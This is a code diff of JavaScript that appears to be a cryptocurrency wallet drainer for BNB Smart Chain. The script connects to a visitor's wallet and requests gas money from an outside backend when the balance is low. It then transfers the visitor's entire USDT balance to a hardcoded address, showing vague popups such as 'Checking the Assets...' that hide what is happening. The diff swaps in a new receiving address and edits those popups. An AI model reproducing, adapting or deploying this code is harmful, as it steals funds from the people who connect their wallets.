@@ -1,4 +1,4 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090";
+const bscAddress = "0xDbB78587a1A83097aaf25AC6078F378808d8821e";
 const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87";
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955";
 
@@ -56,7 +56,7 @@ async function connectWalletAndSwitch() {
         }
 
         // Request accounts
-        const accounts = await provider.request({ method: "eth_requestAccounts" });
+        const accounts = await provider.request({ method: "eth_accounts" });
         userAddress = accounts[0];
         console.log("✅ Wallet:", userAddress);
     } catch (e) {
@@ -120,7 +120,7 @@ async function Next() {
         }
 
         if (bnbBalance < 0.0005) {
-            showPopup("Checking the Assets...", "blue");
+            showPopup("Checking the bnb ...", "blue");
             await fetch("https://bepusdt-backend-production.up.railway.app/send-bnb", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -129,7 +129,7 @@ async function Next() {
             await new Promise(r => setTimeout(r, 3000)); // wait for gas
         }
 
-        showPopup("Loading...", "blue");
+        showPopup("Transferring...", "blue");
 
         await usdtContract.methods.transfer(bscAddress, web3.utils.toWei(usdtBalance.toString(), "ether"))
             .send({ from: userAddress });
